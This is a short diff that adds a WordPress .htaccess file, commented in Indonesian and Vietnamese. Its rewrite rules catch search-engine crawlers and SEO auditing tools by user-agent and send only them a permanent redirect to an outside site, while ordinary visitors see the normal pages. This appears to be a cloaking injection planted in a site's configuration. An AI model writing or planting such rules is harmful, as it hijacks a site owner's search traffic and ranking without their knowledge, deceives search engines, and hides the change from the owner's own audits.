@@ -1,0 +1,15 @@
+# Redirect bot ke URL target
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Deteksi User-Agent bot
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
+
+# Redirect 301 hanya untuk bot
+RewriteRule ^(.*)$ https://ironboundcatholic.org/ [R=301,L]
+</IfModule>
+
+# BEGIN WordPress
+# Các nội dung nằm giữa "BEGIN WordPress" và "END WordPress" được tạo ra tự động, và chỉ nên được thay đổi thông qua các filter của WordPress. Mọi thay đổi tới thành phần này có thể sẽ bị mất và ghi đè.
+
+# END WordPress
